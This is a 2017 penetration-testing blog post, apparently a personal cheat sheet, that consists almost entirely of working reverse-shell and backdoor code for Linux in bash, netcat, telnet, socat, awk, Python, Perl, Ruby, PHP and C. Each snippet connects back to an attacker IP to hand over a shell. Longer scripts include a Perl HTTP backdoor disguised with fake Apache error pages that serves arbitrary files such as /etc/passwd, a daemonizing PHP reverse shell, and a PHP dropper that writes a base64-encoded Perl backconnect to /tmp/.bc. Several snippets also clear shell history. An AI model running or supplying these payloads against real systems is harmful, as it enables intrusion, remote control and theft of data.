---
layout:     post
title:      "Some Ways To Create An Interactive Shell On Linux"
subtitle:   "A little record|Continuously updated"
date:       2017-01-08
author:     "Urahara"
header-img: "img/d4d5dfc09f330ce82b09b792d4281f42.jpg"
header-mask: 0.3
tags:
    - 渗透测试


---

#### Bash

```bash
$ bash -i >& /dev/tcp/192.168.68.206/2333 0>&1
$ exec 196<>/dev/tcp/192.168.68.206/2333; sh <&196 >&196 2>&196
$ exec 5<>/dev/tcp/192.168.68.206/2333 cat <&5 | while read line; do $line 2>&5 >&5;done
$ exec 5<>/dev/tcp/192.168.68.206/2333 cat <&5 | while read line 0<&5; do $line 2>&5 >&5; done
```

#### NC

```bash
$ nc -e /bin/sh 192.168.68.206 2333  //linux下默认安装的nc不带e参数，可上传带e参数的nc进行编译运行
$ mkfifo fifo ; nc.traditional -u 192.168.199.199 5555 < fifo | { bash -i; } > fifo
$ nc 192.168.199.199 5555 -c /bin/bash
$ if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.199.199 5555 > /tmp/f
$ if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc 192.168.199.199 5555 0</tmp/f|/bin/bash 1>/tmp/f
$ nc 192.168.68.206 2333|/bin/sh|nc 192.168.68.206 2444  //需要在本地监听俩端口，一个做命令输入，另一个做回显
```

#### Telnet

```bash
$ rm /tmp/fl;mkfifo /tmp/fl;cat /tmp/fl|/bin/sh -i 2>&1|telnet 192.168.68.206 2333 >/tmp/fl
$ mknod /tmp/fl p && telnet 192.168.68.206 2333 0</tmp/fl | /bin/bash 1>/tmp/fl
$ telnet 192.168.68.206 2333|/bin/sh|telnet 192.168.68.206 2444  //需要在本地监听俩端口，一个做命令输入，另一个做回显
```

### TCHsh

```bash
$ echo 'set s [socket 192.168.199.199 5555];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh # tcp
```

### socat

```bash
$ socat tcp-connect:192.168.199.199:5555 exec:"bash -li",pty,stderr,setsid,sigint,sane # tcp
```

### awk

```Bash
$ # tcp
$ awk 'BEGIN {s = "/inet/tcp/0/192.168.199.199/5555"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
$ # udp
$ awk 'BEGIN {s = "/inet/udp/0/192.168.199.199/5555"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

#### Python

```bash
$ # tcp shell
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.68.206",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ # tcp + pty
$ python -c "import os; import pty; import socket; lhost = '192.168.199.199'; lport = 5555; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();"
$ # udp +pty
$ python -c "import os; import pty; import socket; lhost = '192.168.199.199'; lport = 5555; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();"
$ # subprocess
$ python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.68.206',2333))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

```python
#!/usr/bin/python

import socket,subprocess
HOST = '192.168.68.206'    
PORT = 2333            
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connection Established!\n')
while 1:
     data = s.recv(1024)
     if data == "quit": break
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout_value = proc.stdout.read() + proc.stderr.read()
     s.send(stdout_value)
s.close()
```

```python
#!/usr/bin/python
import sys
import os
import socket
import pty

shell = "/bin/sh"
def usage(programname):
    print "Python connect-back door"
    print "Usage: %s <conn_back_ip> <port>" % programname

def main():
    if len(sys.argv) !=3:
        usage(sys.argv[0])
        sys.exit(1)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((socket.gethostbyname(sys.argv[1]),int(sys.argv[2])))
    print "[+]Connect OK."
except:
    print "[-]Can't connect"
    sys.exit(2)

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

global shell
os.unsetenv("HISTFILE")
os.unsetenv("HISTFILESIZE")
pty.spawn(shell)
s.close()

if __name__ == "__main__":
    main()
```

#### Perl

```bash
$ perl -e 'use Socket;$i="192.168.68.206";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.68.206:2333");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
$ perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);my ($pa,$pp);$s=new IO::Socket::INET->new();$s = new IO::Socket::INET(PeerAddr => "192.168.199.199:5555",Proto => "udp"); $s->send("SHELLPOP PWNED!
");while(1) { $s->recv($r,1024);$pa=$s->peerhost();$pp=$s->peerport();$d=qx($r);$s->send($d);}'
```

```perl
#!/usr/bin/perl 
use IO::Socket; 

$system    = '/bin/sh'; 
$ARGC=@ARGV;  
print "--== ConnectBack Backdoor Shell vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==-- \n\n";  
if ($ARGC!=2) {  
   print "Usage: $0 [Host] [Port] \n\n";  
   die "Ex: $0 127.0.0.1 2121 \n";  
}  
use Socket;  
use FileHandle;  
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n";  
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";  
print "[*] Resolving HostName\n"; 
print "[*] Connecting... $ARGV[0] \n";  
print "[*] Spawning Shell \n"; 
print "[*] Connected to remote host \n"; 
SOCKET->autoflush();  
open(STDIN, ">&SOCKET");  
open(STDOUT,">&SOCKET");  
open(STDERR,">&SOCKET");  
print "--== ConnectBack Backdoor vs 1.0 by LorD of IRAN HACKERS SABOTAGE ==--  \n\n";  
system("unset HISTFILE; unset SAVEHIST ;echo --==Systeminfo==-- ; uname -a;echo; 
echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shell==-- ");  
system($system); 
#EOF  
```

```perl
#usr/bin/perl

# httpbd.pl Usage:
# 1. bind shell:
# nc target 8008
# ->SHELLPASSWORD{ENTER}{ENTER}
# 2. download files
# http://target:8008/file?/etc/passwd
# or
# http://target:8008/file?../some/file
# 3. http shell
# http://target:8008/shell?id;uname -a
# as you see,the script uses a forward shell ,which can help you 

use Socket;

$SHELL="/bin/sh -i";
$SHELLPASSWORD="Urahara";
$LISTENPORT="8008";
$HTTPFILECMD="file";
$HTTPSHELLCMD="shell";

$HTTP404= "HTTP/1.1 404 Not Found\n" .
"Date: Mon, 14 Jan 2002 03:19:55 GMT\n" .
"Server: Apache/1.3.22 (Unix)\n" .
"Connection: close\n" .
"Content-Type: text/html\n\n" .
"<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 4.0//EN\">\n" .
"<HTML><HEAD>\n" .
"<TITLE>404 Not Found</TITLE>\n" .
"</HEAD><BODY>\n" .
"
Not Found
\n" .
"The requested URL was not found on this server.

\n" .
"
\n" .
"<ADDRESS>Apache/1.3.22 Server at localhost Port $LISTENPORT</ADDRESS>\n" .
"</BODY></HTML>\n";

$HTTP400= "HTTP/1.1 400 Bad Request\n" .
"Server: Apache/1.3.22 (Unix)\n" .
"Date: Mon, 14 Jan 2002 03:19:55 GMT\n" .
"Cache-Control: no-cache,no-store\n" .
"Connection: close\n" .
"Content-Type: text/html\n\n" .
"<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 4.0//EN\">\n" .
"<HTML><HEAD><TITLE>400 Bad Request</TITLE></HEAD>" .
"<BODY>" .
"
400 Bad Request
Your request has bad syntax or is inherently impossible to satisfy.</BODY></HTML>\n";

$HTTP200= "HTTP/1.1 200 OK\n" .
"Cache-Control: no-cache,no-store\n" .
"Connection: close\n";

$protocol=getprotobyname('tcp');
socket(S,&PF_INET,&SOCK_STREAM,$protocol) || die "Cant create socket\n";
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
bind (S,sockaddr_in($LISTENPORT,INADDR_ANY)) || die "Cant open port\n";
listen (S,3) || die "Cant listen port\n";
while(1){
accept (CONN,S);
if(! ($pid=fork))
{
die "Cannot fork" if (! defined $pid);
close CONN;
}
else
{
$buf=<CONN>; chomp($buf); $buf=~s/\r//g;
M1:
while($s= <CONN>) {
if($s=~/^\r?\n$/) { last M1; }
}
if($buf eq $SHELLPASSWORD)
{
open STDIN,"<&CONN";
open STDOUT,">&CONN";
open STDERR,">&CONN";
exec $SHELL || die print CONN "Cant execute $SHELL\n";
}
elsif($buf=~/^GET \/$HTTPFILECMD\?([^ ]+) HTTP\/1\.[01]$/)
{
$file=$1;
$file=~s/%([0-9a-f]{2})/chr(hex($1))/ge;
print CONN $HTTP200;
print CONN "Content-type: text/plain\n\n";
open (HTTPFILE,$file) || goto M2;

while(<HTTPFILE>)
{
print CONN $_;
}
close HTTPFILE;
}
elsif($buf=~/^GET \/$HTTPSHELLCMD\?([^ ]+) HTTP\/1\.[01]$/)
{
$shcmd=$1;
$shcmd=~s/%([0-9a-f]{2})/chr(hex($1))/ge;
$out=`$shcmd`;
print CONN $HTTP200;
print CONN "Content-type: text/html\n\n";
print CONN "<body bgcolor=black>\n\n";
print CONN "

".$out."

</body>\n";
}
elsif($buf=~/^GET \/ HTTP\/1\.[01]$/)
{
print CONN $HTTP200;
print CONN "Content-type: text/plain\n\n";
}
elsif($buf=~/^GET (\/[^\/]+)+ HTTP\/1\.[01]$/)
{
print CONN $HTTP404;

}
else
{
print CONN $HTTP400;
}
M2:
close CONN;
exit 0;
}
}
```

#### Ruby

```
$ ruby -rsocket -e'f=TCPSocket.open("192.168.68.206",2333).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
$ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.68.206","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
$ ruby -rsocket -e "c=TCPSocket.new('192.168.68.206','2333');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
```

#### PHP

```bash
$ php -r '$s=fsockopen("192.168.68.206",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
$ php -r '$s=fsockopen("192.168.68.206",2333);`/bin/sh -i <&3 >&3 2>&3`;'
$ php -r '$s=fsockopen("192.168.68.206",2333);system("/bin/sh -i <&3 >&3 2>&3");'
$ php -r '$s=fsockopen("192.168.68.206",2333);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.68.206';  // CHANGE THIS
$port = 2333;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 
```

```php
// exec shell_exec system passthru not in disabled_functions
<?php
function which($pr) {
$path = execute("which $pr");
return ($path ? $path : $pr);
}
function execute($cfe) {
$res = '';
if ($cfe) {
if(function_exists('exec')) {
@exec($cfe,$res);
$res = join("\n",$res);
} elseif(function_exists('shell_exec')) {
$res = @shell_exec($cfe);
} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = '';
while(!@feof($f)) {
$res .= @fread($f,1024);
}
@pclose($f);
}
}
return $res;
}
function cf($fname,$text){
if($fp=@fopen($fname,'w')) {
@fputs($fp,@base64_decode($text));
@fclose($fp);
}
}
 
$yourip = "192.168.68.206";
$yourport = "2333";
$usedb = array('perl'=>'perl','c'=>'c');
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
cf('/tmp/.bc',$back_connect);
$res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
?>
```

#### C

```c
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>

void usage();
char shell[]="/bin/sh";
char message[]="welcome\n";
int sock;
int main(int argc, char *argv[]) {
if(argc <3){
usage(argv[0]);
}

struct sockaddr_in server;
if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
printf("Couldn't make socket!\n"); exit(-1);
}

server.sin_family = AF_INET;
server.sin_port = htons(atoi(argv[2]));
server.sin_addr.s_addr = inet_addr(argv[1]);

if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
printf("Could not connect to remote shell!\n");
exit(-1);
}
send(sock, message, sizeof(message), 0);
dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);
execl(shell,"/bin/sh",(char *)0);
close(sock);
return 1;
}

void usage(char *prog[]) {
   printf("\t\t connect back door\n\n");

printf("Usage: %s <reflect ip> <port>\n", prog);
exit(-1);
}

// gcc -o fl fl.c
// ./fl 192.168.1.14 8888
```

> 除以上方法之外像msf也是不错的选择 :D
>
> 以上方法建立shell后，若发现为非交互式的，执行以下命令获取ttyshell 
>
> python -c 'import pty;pty.spawn("/bin/sh")'